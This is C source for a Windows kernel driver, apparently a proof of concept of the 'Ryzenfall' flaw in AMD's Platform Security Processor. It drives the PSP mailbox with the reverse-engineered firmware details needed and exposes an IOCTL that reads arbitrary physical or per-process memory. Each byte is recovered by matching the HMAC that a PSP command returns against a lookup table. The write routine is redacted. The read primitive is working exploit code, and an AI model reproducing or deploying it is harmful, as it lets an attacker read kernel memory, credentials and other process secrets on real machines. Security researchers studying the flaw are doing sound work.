//
// @depletionmode 2019
//

#include <ntddk.h>
#include <wdf.h>

#include "Trace.h"
#include "RyzenfallDrv.h"

EXTERN_C_START

typedef struct _PSP_DRV_CONTEXT
{
#define HMAC_LEN 0x20
    BYTE HmacLookupTable[0x100][HMAC_LEN];
    BOOLEAN LookupTableInitialized;

    ULONG PspMailboxAddress;

} PSP_DRV_CONTEXT, *PPSP_DRV_CONTEXT;
WDF_DECLARE_CONTEXT_TYPE_WITH_NAME(PSP_DRV_CONTEXT, DeviceGetContext);

WDFDEVICE g_Device;

DRIVER_INITIALIZE DriverEntry;
EVT_WDF_DRIVER_DEVICE_ADD PspEvtDeviceAdd;
EVT_WDF_OBJECT_CONTEXT_CLEANUP PspEvtDriverContextCleanup;
EVT_WDF_IO_QUEUE_IO_DEVICE_CONTROL PspEvtIoDeviceControl;

NTSTATUS
PsppRetrieveIoBuffers (
    _In_ WDFREQUEST Request,
    _In_ SIZE_T MinimumInputBufferLength,
    _Out_opt_ PVOID *InputBuffer,
    _In_ SIZE_T MinimumOutputBufferLength,
    _Out_opt_ PVOID *OutputBuffer
    );

NTSTATUS
PsppReadMemory (
    _In_ PVOID Address,
    _In_ ULONG ProcessId,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ SIZE_T Length
    );

NTSTATUS
PsppWriteMemory (
    _In_ PVOID Address,
    _In_ ULONG ProcessId,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ SIZE_T Length
    );

EXTERN_C_END

#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)

#pragma alloc_text (PAGE, PspEvtDeviceAdd)
#pragma alloc_text (PAGE, PspEvtIoDeviceControl)
#pragma alloc_text (PAGE, PspEvtDriverContextCleanup)

#pragma alloc_text (PAGE, PsppRetrieveIoBuffers)

#pragma alloc_text (PAGE, PsppReadMemory)
#pragma alloc_text (PAGE, PsppWriteMemory)
#endif

#include "Trace.h"
#include "RyzenfallDrv.tmh"

#define TRACE(L, ...)           \
    TraceEvents(L,              \
                TRACE_DRIVER,   \
                __VA_ARGS__)

// TODO: Make these macros work.
#define TRACE_INFO(...)  TRACE(TRACE_LEVEL_INFORMATION, __VA_ARGS__)
#define TRACE_WARN(...)  TRACE(TRACE_LEVEL_WARNING, __VA_ARGS__)
#define TRACE_ERROR(...) TRACE(TRACE_LEVEL_ERROR, __VA_ARGS__)

#define PSP_SUCCESS(status) (NT_SUCCESS(status) && STATUS_TIMEOUT != status)    // NT_SUCCESS considers STATUS_TIMEOUT to be a success condition.

FORCEINLINE NTSTATUS _getPspMailboxAddress (PHYSICAL_ADDRESS *);
FORCEINLINE NTSTATUS _decodeByte (BYTE [HMAC_LEN], BYTE *);
            NTSTATUS _callPsp (ULONG, ULONG, BYTE *);
FORCEINLINE NTSTATUS _waitOnPspCommandDone (volatile PVOID);
FORCEINLINE NTSTATUS _waitOnPspReady (volatile PVOID);
FORCEINLINE BOOLEAN  _hasPspError (volatile PVOID);
FORCEINLINE NTSTATUS _populateHmacLookupTable (BYTE[][HMAC_LEN]);
FORCEINLINE NTSTATUS _readPaByteViaPsp (PHYSICAL_ADDRESS, BYTE *);

#define POOL_TAG_(n) #@n    // https://docs.microsoft.com/en-us/cpp/preprocessor/charizing-operator-hash-at
#define POOL_TAG(n) POOL_TAG_(n##nzR)

//
// Declare these here due to conflicts including ntifs.h
//

NTSTATUS PsLookupProcessByProcessId (
    HANDLE    ProcessId,
    PEPROCESS *Process
    );

void KeStackAttachProcess (
    PRKPROCESS   PROCESS,
    PVOID /* PRKAPC_STATE */ ApcState
    );

void KeUnstackDetachProcess (
    PVOID /* PRKAPC_STATE */ ApcState
    );

NTSTATUS
DriverEntry (
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
    )
{
    NTSTATUS status;
    WDF_DRIVER_CONFIG config;
    WDF_OBJECT_ATTRIBUTES attributes;

    WPP_INIT_TRACING(DriverObject, RegistryPath);

    WDF_DRIVER_CONFIG_INIT(&config, PspEvtDeviceAdd);

    WDF_OBJECT_ATTRIBUTES_INIT(&attributes);
    attributes.EvtCleanupCallback = (PFN_WDF_OBJECT_CONTEXT_CLEANUP)PspEvtDriverContextCleanup;

    status = WdfDriverCreate(DriverObject,
                             RegistryPath,
                             WDF_NO_OBJECT_ATTRIBUTES,
                             &config,
                             WDF_NO_HANDLE);
    if (!NT_SUCCESS(status)) {
        TraceEvents(TRACE_LEVEL_ERROR, 
                    TRACE_DRIVER, 
                    "%!FUNC!: Failed to load Psp driver. (%!STATUS!)", 
                    status);

        WPP_CLEANUP(DriverObject);
        
        goto end;
    }

    TraceEvents(TRACE_LEVEL_ERROR, 
                TRACE_DRIVER, 
                "%!FUNC!: Psp driver loaded.");

end:
    return status;
}

NTSTATUS
PspEvtDeviceAdd (
    _In_    WDFDRIVER       Driver,
    _Inout_ PWDFDEVICE_INIT DeviceInit
    )
{
    NTSTATUS status;
    WDFDEVICE device;
    PPSP_DRV_CONTEXT deviceContext;
    WDF_OBJECT_ATTRIBUTES deviceAttributes;
    WDFQUEUE queue;
    WDF_IO_QUEUE_CONFIG queueConfig;

    UNREFERENCED_PARAMETER(Driver);

    PAGED_CODE();

    //
    // Create device object.
    //

    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&deviceAttributes, PSP_DRV_CONTEXT);
    
    status = WdfDeviceCreate(&DeviceInit,
                             &deviceAttributes,
                             &device);
    if (!NT_SUCCESS(status)) {
        TraceEvents(TRACE_LEVEL_ERROR, 
                    TRACE_DRIVER, 
                    "%!FUNC!: Failed to create device. (%!STATUS!)", 
                    status);

        goto end;
    }

    //
    // Initialize device context.
    //

    g_Device = device;    
    deviceContext = DeviceGetContext(device);
    RtlZeroMemory(deviceContext, sizeof(*deviceContext));

    //
    // Create device interface for communicating with user-mode user-mode.
    //
    
    status = WdfDeviceCreateDeviceInterface(device,
                                            &PspDriverGuid,
                                            NULL);
    if (!NT_SUCCESS(status)) {
        TraceEvents(TRACE_LEVEL_ERROR, 
                    TRACE_DRIVER, 
                    "%!FUNC!: Failed to create interface. (%!STATUS!)", 
                    status);

        goto end;
    }

    //
    // Initialize device IO queue and ioctl handler callback.
    //

    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&queueConfig, WdfIoQueueDispatchParallel);
    queueConfig.EvtIoDeviceControl = PspEvtIoDeviceControl;

    status = WdfIoQueueCreate(device,
                              &queueConfig,
                              WDF_NO_OBJECT_ATTRIBUTES,
                              &queue);
    if (!NT_SUCCESS(status))
    {
        TraceEvents(TRACE_LEVEL_ERROR,
                    TRACE_DRIVER,
                    "%!FUNC!: Failed to create queue. (%!STATUS!)",
                    status);

        goto end;
    }

    TraceEvents(TRACE_LEVEL_INFORMATION, 
                TRACE_DRIVER, 
                "%!FUNC!: Device creation successful.");

end:
    return status;
}

VOID
PspEvtDriverContextCleanup (
    _In_ WDFOBJECT DriverObject
    )
{
    PAGED_CODE();

    WPP_CLEANUP(WdfDriverWdmGetDriverObject((WDFDRIVER)DriverObject));
}

NTSTATUS
PsppRetrieveIoBuffers(
    _In_ WDFREQUEST Request,
    _In_ SIZE_T MinimumInputBufferLength,
    _Out_opt_ PVOID *InputBuffer,
    _In_ SIZE_T MinimumOutputBufferLength,
    _Out_opt_ PVOID *OutputBuffer
    )
{
    NTSTATUS status;

    PAGED_CODE();

    if (NULL != InputBuffer) {
        status = WdfRequestRetrieveInputBuffer(Request,
                                               MinimumInputBufferLength,
                                               InputBuffer,
                                               NULL);
        if (!NT_SUCCESS(status)) {
            TraceEvents(TRACE_LEVEL_ERROR,
                        TRACE_DRIVER,
                        "%!FUNC!: Failed to retrieve input buffer. (%!STATUS!)",
                        status);

            goto end;
        }
    }

    if (NULL != OutputBuffer) {
        status = WdfRequestRetrieveInputBuffer(Request,
                                               MinimumOutputBufferLength,
                                               OutputBuffer,
                                               NULL);
        if (!NT_SUCCESS(status)) {
            TraceEvents(TRACE_LEVEL_ERROR,
                        TRACE_DRIVER,
                        "%!FUNC!: Failed to retrieve output buffer. (%!STATUS!)",
                        status);

            goto end;
        }
    }

    status = STATUS_SUCCESS;

end:
    return status;
}

VOID
PspEvtIoDeviceControl (
    _In_ WDFQUEUE Queue,
    _In_ WDFREQUEST Request,
    _In_ size_t OutputBufferLength,
    _In_ size_t InputBufferLength,
    _In_ ULONG IoControlCode
    )
{
    NTSTATUS status;
    WDFMEMORY memory = NULL;

    PAGED_CODE();

    TraceEvents(TRACE_LEVEL_INFORMATION,
                TRACE_DRIVER,
                "%!FUNC! Queue 0x%p, Request 0x%p OutputBufferLength %d InputBufferLength %d IoControlCode %d",
                Queue, Request, (int)OutputBufferLength, (int)InputBufferLength, IoControlCode);

    //
    // Handle ioctl.
    //

    switch (IoControlCode) {
    case IOCTL_PSP_READ_MEMORY:
    {
        PPSP_READ_MEMORY_REQUEST request;

        status = PsppRetrieveIoBuffers(Request,
                                       sizeof(*request),
                                       &request,
                                       0,
                                       NULL);
        if (!NT_SUCCESS(status)) {
            TraceEvents(TRACE_LEVEL_ERROR,
                        TRACE_DRIVER,
                        "%!FUNC!: Invalid IO buffers. (%!STATUS!)",
                        status);

            goto end;
        }

        //
        // The response isn't passed back in an ioctl output buffer, rather in 
        // a user-mode buffer allocated by the caller for this purpose.
        //

        status = WdfRequestProbeAndLockUserBufferForWrite(Request, 
                                                          request->ResponseBuffer, 
                                                          request->Length, 
                                                          &memory);
        if (!NT_SUCCESS(status)) {
            TraceEvents(TRACE_LEVEL_ERROR,
                        TRACE_DRIVER,
                        "%!FUNC!: Failed to probe+lock user-mode buffer. (%!STATUS!)",
                        status);

            goto end;
        }

        status = PsppReadMemory(request->Address,
                                request->ContextProcessId,
                                WdfMemoryGetBuffer(memory, (size_t*)&request->Length),
                                request->Length);

        break;
    }
    case IOCTL_PSP_WRITE_MEMORY:
    {
        PPSP_WRITE_MEMORY_REQUEST request;

        status = PsppRetrieveIoBuffers(Request,
                                       sizeof(*request),
                                       &request,
                                       0,
                                       NULL);
        if (!NT_SUCCESS(status)) {
            TraceEvents(TRACE_LEVEL_ERROR,
                        TRACE_DRIVER,
                        "%!FUNC!: Invalid IO buffers. (%!STATUS!)",
                        status);

            goto end;
        }


        status = WdfRequestProbeAndLockUserBufferForRead(Request,
                                                         request->Buffer,
                                                         request->Length,
                                                         &memory);
        if (!NT_SUCCESS(status)) {
            TraceEvents(TRACE_LEVEL_ERROR,
                        TRACE_DRIVER,
                        "%!FUNC!: Failed to probe+lock user-mode buffer. (%!STATUS!)",
                        status);

            goto end;
        }

        status = PsppWriteMemory(request->Address,
                                 request->ContextProcessId,
                                 WdfMemoryGetBuffer(memory, (size_t*)&request->Length),
                                 request->Length);

        break;
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        TraceEvents(TRACE_LEVEL_ERROR,
                    TRACE_DRIVER,
                    "%!FUNC!: Unknown IO control code %d. (%!STATUS!)",
                    IoControlCode,
                    status);

        goto end;
    }

    if (!PSP_SUCCESS(status)) {
        TraceEvents(TRACE_LEVEL_ERROR,
                    TRACE_DRIVER,
                    "%!FUNC!: Ioctl %d failed. (%!STATUS!)",
                    IoControlCode,
                    status);
    }

end:
    if (status == STATUS_TIMEOUT) {
        status = STATUS_IO_TIMEOUT;   // Hack to convert STATUS_TIMEOUT to a failure code.
    }

    WdfRequestComplete(Request, status);
}

NTSTATUS
PsppReadMemory (
    _In_ PVOID Address,
    _In_ ULONG ProcessId,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ SIZE_T Length
    )
{
    NTSTATUS status;
    PEPROCESS process = NULL;
    BYTE hmac[HMAC_LEN];
    BYTE *buffer = Buffer;
    PHYSICAL_ADDRESS physicalAddress;
    BYTE apcState[0x100];   // Allocate sufficient storage on the stack for opaque KAPC_STATE.
    BOOLEAN stackAttached = FALSE;

    PAGED_CODE();

    //
    // Perform context switch if the requested range is a user-mode region.
    // We don't perform enough here to ensure that parameters are sane and
    // live in the hope that the caller is behaving itself.
    //
    
    if (0 != ProcessId) {
        status = PsLookupProcessByProcessId((HANDLE)ProcessId, &process);
        if (!NT_SUCCESS(status)) {
            TraceEvents(TRACE_LEVEL_ERROR,
                        TRACE_DRIVER,
                        "%!FUNC!: Failed to reference process. (%!STATUS!)",
                        status);

            goto end;
        }

        KeStackAttachProcess((PRKPROCESS)process, &apcState);
        stackAttached = TRUE;
    }

    physicalAddress = MmGetPhysicalAddress(Address);

    //
    // Use Ryzenfall to read from physicalAddress byte-byte.
    //
    
    for (ULONG idx = 0; idx < Length; idx++) {
        status = _readPaByteViaPsp(physicalAddress, hmac);
        if (!PSP_SUCCESS(status)) {
            TraceEvents(TRACE_LEVEL_ERROR,
                        TRACE_DRIVER,
                        "%!FUNC!: Failed to read via PSP. (%!STATUS!)",
                        status);

            goto end;
        }
        
        status = _decodeByte(hmac, &buffer[idx]);
        if (!PSP_SUCCESS(status)) {
            TraceEvents(TRACE_LEVEL_ERROR,
                        TRACE_DRIVER,
                        "%!FUNC!: Failed to devoce byte. (%!STATUS!)",
                        status);

            goto end;
        }

        physicalAddress.QuadPart++;
    }

    status = STATUS_SUCCESS;

end:
    if (stackAttached) {
        KeUnstackDetachProcess(&apcState);
        stackAttached = FALSE;
    }

    if (NULL != process) {
        ObDereferenceObject(process);
        process = NULL;
    }

    return status;
}

//
// MessageId: STATUS_REDACTED
//
// MessageText:
//
// The specified request requires you to practice responsible research.
//
#define STATUS_REDACTED    ((NTSTATUS)0xC000FEEDL)

NTSTATUS
PsppWriteMemory (
    _In_ PVOID Address,
    _In_ ULONG ProcessId,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ SIZE_T Length
    )
{
    UNREFERENCED_PARAMETER(Address);
    UNREFERENCED_PARAMETER(ProcessId);
    UNREFERENCED_PARAMETER(Buffer);
    UNREFERENCED_PARAMETER(Length);

    //
    // Redacted.
    //

    PAGED_CODE()

    return STATUS_REDACTED;
}

FORCEINLINE
NTSTATUS
_decodeByte (
    _In_ BYTE Hmac[HMAC_LEN],
    _Out_ BYTE *Byte
    )
{
    NTSTATUS status;
    PPSP_DRV_CONTEXT context;

    NT_ASSERT(Hmac != NULL);
    NT_ASSERT(Byte != NULL);

    PAGED_CODE();

    context = WdfObjectGetTypedContext(g_Device, PSP_DRV_CONTEXT);

    //
    // Create lookup table necessary to decode PSP reads.
    //

    if (!context->LookupTableInitialized) {
        status = _populateHmacLookupTable(context->HmacLookupTable);
        if (!PSP_SUCCESS(status)) {
            TraceEvents(TRACE_LEVEL_ERROR,
                        TRACE_DRIVER,
                        "%!FUNC!: Failed to build Hmac lookup table. (%!STATUS!)",
                        status);

            goto end;
        }

        context->LookupTableInitialized = TRUE;
    }

    //
    // This is a nasty O(n) lookup. A hashtable would be a better option.
    //

    for (ULONG idx = 0; idx < 0x100; idx++) {
        if (HMAC_LEN == RtlCompareMemory(Hmac,
                                         context->HmacLookupTable[idx],
                                         HMAC_LEN)) {
            *Byte = idx & 0xff;
            status = STATUS_SUCCESS;

            goto end;
        }
    }

    //
    // Control reaching here means that the lookup failed.
    //

    status = STATUS_NOT_FOUND;

end:
    return status;
}

FORCEINLINE
NTSTATUS
_getPspMailboxAddress (
    _Out_ PHYSICAL_ADDRESS *Address
    )
{
    NTSTATUS status;
    PPSP_DRV_CONTEXT context;
    ULONG pspBaseAddress;

    NT_ASSERT(Address != NULL);

    context = WdfObjectGetTypedContext(g_Device, PSP_DRV_CONTEXT);

    if (0 == context->PspMailboxAddress) {
        __try {
            //
            // If Coreboot is any indication as to what goes on in the rotten 
            // carcass that is some closed-source firmware implementations, 
            // MSR[0xc00110a2] seems to be be written to with the PCIe Bar3 
            // address of the PSP base by the firmware during boot (undocumented 
            // publically - other than in Coreboot). This seems to be the most 
            // straightforward way of obtaining the PSP base address post-boot 
            // (as the PCIe bar can subsequently be hidden). 
            // It is also unclear to me as to whether this is actually Bar4 rather 
            // than Bar3. The Coreboot code seems to indicate that it's called 
            // Bar3 by the NDA'd AMD documentation (which I do not have access to 
            // and have not seen) but is actually Bar4 which, on my machine 
            // (Gigabyte Auorus Gaming 5 X370 1.0 w/ Ryzen 2700X), seems to be 
            // blank (regardless of the 'bar hidden' flag).
            // In any event, from my reversing of various DXE modules, I note 
            // that reading the aforementioned MSR seems the popular method 
            // for determining the PSP base address.
            //
            // I found an alternative method for discovering the PSP base in 
            // AmdPspDxeV2.efi (which is actually responsible for writing the 
            // address to MSR[0xc00110a2]:
            //
            // MEMORY[0xF80000B8] = 0x13B102E0;
            // pspBase = MEMORY[0xF80000BC] & 0xFFF00000;
            //

#define MSR_PSP_BASE 0xc00110a2

            pspBaseAddress = (ULONG)__readmsr(MSR_PSP_BASE);
            if (0 == pspBaseAddress) {
                status = STATUS_UNSUCCESSFUL;
                TraceEvents(TRACE_LEVEL_ERROR,
                            TRACE_DRIVER,
                            "%!FUNC!: PspMailboxAddress retrieval failed. MSR null. (%!STATUS!)",
                            status);

                goto end;
            }

            //
            // V2 offset found in AmdPspDxeV2.efi
            //
            // v4 = (const signed __int32 *)((MEMORY[0xF80000BC] & 0xFFF00000) + 0x10570);
            //

#define PSP_V2_MAILBOX_OFFSET 0x10570

            context->PspMailboxAddress = pspBaseAddress + PSP_V2_MAILBOX_OFFSET;

        } __except (EXCEPTION_EXECUTE_HANDLER) {
            status = GetExceptionCode();
            TraceEvents(TRACE_LEVEL_ERROR,
                        TRACE_DRIVER,
                        "%!FUNC!: PspMailboxAddress retrieval failed. MSR read failed. (%!STATUS!)",
                        status);

            goto end;
        }
    
        TraceEvents(TRACE_LEVEL_INFORMATION,
                    TRACE_DRIVER,
                    "%!FUNC!: PspMailboxAddress @ 0x%x.",
                    context->PspMailboxAddress);
        }

    Address->HighPart = 0;
    Address->LowPart = context->PspMailboxAddress;

    status = STATUS_SUCCESS;

end:
    return status;
}

#pragma pack(push, 1)
typedef struct _PSP_CMD {
    volatile BYTE SecondaryStatus;

    BYTE Unknown;

    volatile BYTE Command;
    volatile BYTE Status;

    ULONG_PTR CommandBuffer;

} PSP_CMD, *PPSP_CMD;

typedef struct _PSP_CMD_BUFFER {
    ULONG Size;
    volatile ULONG Status;

    volatile BYTE Data[ANYSIZE_ARRAY];

} PSP_CMD_BUFFER, *PPSP_CMD_BUFFER;
#define PSP_COMMAND_BUFFER_HEADER_SIZE (sizeof(PSP_CMD_BUFFER) - sizeof(((PPSP_CMD_BUFFER)0)->Data))
#pragma pack(pop)

NTSTATUS _callPsp (
    _In_ ULONG Command,
    _In_ ULONG DataLength,          // Storage for DataBuffer must be of 
                                    // sufficient size to allow for 
                                    // construction of the header, but this 
                                    // parameter is the size of the data 
                                    // itself, excluding the header storage.
    _Inout_ BYTE *DataBuffer
    )
{
    NTSTATUS status;
    PHYSICAL_ADDRESS commandPa;
    PPSP_CMD commandVa = NULL;
    PHYSICAL_ADDRESS commandBufferPa;
    PPSP_CMD_BUFFER commandBufferVa;

    NT_ASSERT(DataBuffer != NULL);

    //
    // Obtain the PSP mailbox address.
    //

    status = _getPspMailboxAddress(&commandPa);
    if (!NT_SUCCESS(status)) {
        TraceEvents(TRACE_LEVEL_ERROR,
                    TRACE_DRIVER,
                    "%!FUNC!: PspMailboxAddress retrieval failed. (%!STATUS!)",
                    status);

        goto end;
    }

    //
    // Map the mailbox IO space into system virtual address space.
    //

    commandVa = (PPSP_CMD)MmMapIoSpace(commandPa,
                                       sizeof(PSP_CMD),
                                       MmNonCached);
    if (NULL == commandVa) {
        status = STATUS_INSUFFICIENT_RESOURCES;
        TraceEvents(TRACE_LEVEL_ERROR,
                    TRACE_DRIVER,
                    "%!FUNC!: PspMailboxAddress retrieval failed. (%!STATUS!)",
                    status);

        goto end;
    }

    //
    // Ensure that the PSP is ready to receive commands.
    //

    // TODO: test for HALT? _bittest(commandVa, 30)

    status = _waitOnPspReady((PVOID)&commandVa->Status);
    if (!PSP_SUCCESS(status)) { 
        goto end;
    }
    
    status = _waitOnPspCommandDone((PVOID)&commandVa->Command);
    if (!PSP_SUCCESS(status)) {
        goto end;
    }
    
    //
    // Contruct the command and copy in the command buffer. The caller to this 
    // function supplies storage for the command buffer. This storage must be 
    // sizeof(PSP_CMD_BUFFER) - sizeof(BYTE*) greater than the contents of the 
    // buffer to allow for addition of the header.
    //
    // NOTE: The ordering of the following code is *very* important. 
    //       Note, also, the use of RtlMoveMemory to handle the overlapping 
    //       source and destination buffers.
    //

    commandBufferVa = (PPSP_CMD_BUFFER)DataBuffer;
    commandBufferPa = MmGetPhysicalAddress(commandBufferVa);
    commandVa->CommandBuffer = commandBufferPa.QuadPart;
    
    RtlMoveMemory((PVOID)commandBufferVa->Data, DataBuffer, DataLength);

    commandBufferVa->Size = PSP_COMMAND_BUFFER_HEADER_SIZE + DataLength;
    commandBufferVa->Status = 0;
    
    //
    // Setting the command byte calls into the PSP for processing.
    //

    commandVa->Command = Command & 0xff;     // AmdPspDxeV2.efi: *(_DWORD *)mailbox_ptr_ = (unsigned __int8)cmd_ << 16;

    status = _waitOnPspCommandDone((PVOID)&commandVa->Command);
    if (!PSP_SUCCESS(status)) {
        goto end;
    }

    //
    // Processing is done. Check for interface error.
    //

    if (_hasPspError((PULONG)&commandVa->Status)) {
        status = commandVa->Status;   // Hack.
        TraceEvents(TRACE_LEVEL_ERROR,
                    TRACE_DRIVER,
                    "%!FUNC!: PSP Interface error. (%!STATUS!)",
                    status);

        goto end;
    }

    //
    // Check for command error.
    //

    if (0 != commandBufferVa->Status) {
        status = commandBufferVa->Status;   // Hack.
        TraceEvents(TRACE_LEVEL_ERROR,
                    TRACE_DRIVER,
                    "%!FUNC!: PSP Command error. (%!STATUS!)",
                    status);

        goto end;
    }

    //
    // If control reaches here, the command has miraculously suceeded.
    // Now strip the command buffer header and return to the caller.
    //

    RtlMoveMemory(DataBuffer, (PVOID)commandBufferVa->Data, DataLength);

    status = STATUS_SUCCESS;

end:
    if (NULL != commandVa) {
        MmUnmapIoSpace(commandVa, sizeof(PSP_CMD));
        commandVa = NULL;
    }

    return status;
}

//
// Mailbox status flags reversed from AmdPspPeiV1.efi:Psp_SendC2Cmd.
//

#pragma pack(push, 1)
typedef struct _PSP_DATA_INFO_BUFFER {
    ULONG_PTR PhysicalAddress;
    SIZE_T Size;

    BYTE Hmac[HMAC_LEN];

} PSP_DATA_INFO_BUFFER, *PPSP_DATA_INFO_BUFFER;
#define PSP_DATA_INFO_CMD 8
#pragma pack(pop)

FORCEINLINE
NTSTATUS
_populateHmacLookupTable (
    BYTE Table[][HMAC_LEN]
    )
{
    NTSTATUS status;
    ULONG idx;
    PHYSICAL_ADDRESS storagePa;

    NT_ASSERT(Table != NULL);

    //
    // Build the HMAC lookup table needed for decoding by incrementing a byte 
    // at a known location (using the stack address of the loop idx), reading 
    // it via the relevant PSP function and storing the resultant HMAC value.
    //

    storagePa = MmGetPhysicalAddress(&idx);

    for (idx = 0; idx < 0x100; idx++) {
        //
        // Ask the PSP to calculate the HMAC  of idx.
        //

        status = _readPaByteViaPsp(storagePa, Table[idx]);
        if (!PSP_SUCCESS(status)) {
            goto end;
        }
    }

    status = STATUS_SUCCESS;

end:
    return status;
}

FORCEINLINE
NTSTATUS
_readPaByteViaPsp (
    _In_ PHYSICAL_ADDRESS Address,
    _Out_ BYTE *Hmac
    )
{
    NTSTATUS status;
    BYTE *buffer;
    PPSP_DATA_INFO_BUFFER dataInfoBuffer;

    //
    // Allocate storage for PSP command buffer.
    //

#define SINGLE_BYTE_LENGTH 1    // We only calculate the hash on a single byte.

    buffer = ExAllocatePoolWithTag(NonPagedPoolNx, 
                                   PSP_COMMAND_BUFFER_HEADER_SIZE + sizeof(PSP_DATA_INFO_BUFFER), 
                                   POOL_TAG(1));
    if (NULL == buffer) {
        status = STATUS_INSUFFICIENT_RESOURCES;
        TraceEvents(TRACE_LEVEL_ERROR,
                    TRACE_DRIVER,
                    "%!FUNC!: Failed to allocate command buffer. (%!STATUS!)",
                    status);

        goto end;
    }

    dataInfoBuffer = (PPSP_DATA_INFO_BUFFER)buffer;
    dataInfoBuffer->PhysicalAddress = Address.QuadPart;
    dataInfoBuffer->Size = 1;
    RtlZeroMemory(dataInfoBuffer->Hmac, HMAC_LEN);

    //
    // 'Read' via PSP_DATA_INFO_CMD.
    //

    status = _callPsp(PSP_DATA_INFO_CMD, sizeof(PSP_DATA_INFO_BUFFER), buffer);
    if (!PSP_SUCCESS(status)) {
        TraceEvents(TRACE_LEVEL_ERROR,
                    TRACE_DRIVER,
                    "%!FUNC!: PSP_DATA_INFO_CMD call failed. (%!STATUS!)",
                    status);

        goto end;
    }

    RtlCopyMemory(Hmac, dataInfoBuffer->Hmac, HMAC_LEN);

end:
    if (NULL != buffer) {
        ExFreePoolWithTag(buffer, POOL_TAG(1));
        buffer = NULL;
    }

    return status;
}

//
// Code to handle the various PSP wait conditions.
//

#define DELAY_MS 1
#define TIMEOUT_MS 1000

typedef BOOLEAN(*PFCN_CONDITION)(volatile PVOID);

NTSTATUS _sleep (PKEVENT, ULONG);
BOOLEAN _isPspReady (volatile PVOID);
BOOLEAN _isPspCommandDone (volatile PVOID);

NTSTATUS
_waitOnCondition (
    _In_ PFCN_CONDITION Condition,
    _In_ volatile PVOID Address
    )
{
    NTSTATUS status;
    KEVENT event;
    ULONG timeoutCountdown;

    timeoutCountdown = TIMEOUT_MS / DELAY_MS;

    while (!Condition(Address)) {
        status = _sleep(&event, DELAY_MS);
        if (!NT_SUCCESS(status)) { 
            goto end;
        }

        if (0 == timeoutCountdown--) {
            status = STATUS_TIMEOUT;

            goto end;
        }
    }

    status = STATUS_SUCCESS;

end:
    return status;
}

FORCEINLINE
NTSTATUS
_waitOnPspReady (
    _In_ volatile PVOID InterfaceStatus
    )
{
    NTSTATUS status;

    status = _waitOnCondition(_isPspReady, InterfaceStatus);
    if (!PSP_SUCCESS(status)) {
        TraceEvents(TRACE_LEVEL_ERROR,
                    TRACE_DRIVER,
                    "%!FUNC!: Mailbox never entered ready state. (%!STATUS!)",
                    status);

        goto end;
    }

end:
    return status;
}

BOOLEAN _isPspReady (
    _In_ volatile PVOID InterfaceStatus
    )
{
    //
    // Wait on PSP_MBOX_STS_READY flag to ensure that PSP is ready to receive commands.
    //
    // AmdPspDxeV1.efi:
    //   .text:0000000000000F61   mov     r9b, 1
    //   *snip*
    //   .text:0000000000000FC6   mov     eax, [r8+74h]   ; <--
    //   .text:0000000000000FCA   test    r9b, al         ;    |
    //   .text:0000000000000FCD   jz      short loc_FC6   ; ---
    //
    // AmdPspDevV2.efi: [implemented]
    //   while ( !_bittest((const signed __int32 *)mailbox_ptr_, 0x1Fu) )
    //

#define PSP_MBOX_STS_READY_BIT 0x7

    return _bittest(InterfaceStatus, PSP_MBOX_STS_READY_BIT);
}

FORCEINLINE
NTSTATUS
_waitOnPspCommandDone (
    _In_ volatile PVOID Command
    )
{
    NTSTATUS status;

    status = _waitOnCondition(_isPspCommandDone, Command);
    if (!PSP_SUCCESS(status)) {
        TraceEvents(TRACE_LEVEL_ERROR,
                    TRACE_DRIVER,
                    "%!FUNC!: Mailbox never completed command. (%!STATUS!)",
                    status);

        goto end;
    }

end:
    return status;
}

BOOLEAN _isPspCommandDone (
    _In_ volatile PVOID Command
    )
{
    //
    // Wait on command being cleared in shared IO space which indicates that 
    // the PSP is finished processing the command.
    //
    // AmdPspDxeV1.efi:
    //   .text:0000000000000FC6   mov     eax, [r8+74h]   ; <--
    //   *snip*                                                |
    //   .text:0000000000000FCF   mov     eax, [r8 + 70h] ;    |
    //   .text:0000000000000FD3   test    eax, eax        ;    |
    //   .text:0000000000000FD5   jnz     short loc_FC6   ; ---
    //
    // AmdPspDevV2.efi: [implemented]
    //   while ( *(_DWORD *)mailbox_ptr_ & 0xFF0000 )
    //

    return 0 == *(BYTE *)Command;
}

FORCEINLINE
BOOLEAN
_hasPspError (
    _In_ volatile PVOID InterfaceStatus
    )
{
    //
    // AmdPspDxeV1.efi:
    // .text:0000000000000FF1   mov     eax, [r8 + 74h]
    // .text:0000000000000FF5   test    al, 2
    // .text:0000000000000FF7   jnz     short loc_1001    ; bad
    // .text:0000000000000FF9   mov     eax, [r8 + 74h]
    // .text:0000000000000FFD   test    al, 4
    // .text:0000000000000FFF   jz      short loc_1004    ; good
    // .text:0000000000001001 loc_1001:
    // *snip*
    //

#define PSP_MBOX_STS_ERR1_BIT 0x2
#define PSP_MBOX_STS_ERR2_BIT 0x4

    UNREFERENCED_PARAMETER(InterfaceStatus);

    return FALSE; // TODO: Work this out for V2
}

NTSTATUS
_sleep (
    _In_ PKEVENT Event,
    _In_ ULONG SleepTimeMs
    )
{
    NTSTATUS status;
    LARGE_INTEGER timeout;

    KeInitializeEvent(Event, SynchronizationEvent, FALSE);
    timeout.QuadPart = -10 * 1000 * (LONGLONG)SleepTimeMs;

    status = KeWaitForSingleObject(Event, 
                                   UserRequest, 
                                   KernelMode, 
                                   FALSE, 
                                   &timeout);
    if (!PSP_SUCCESS(status)) {
        TraceEvents(TRACE_LEVEL_ERROR,
                    TRACE_DRIVER,
                    "%!FUNC!: Failed to set wait on timer object. (%!STATUS!)",
                    status);

        goto end;
    }

end:
    return status;
}
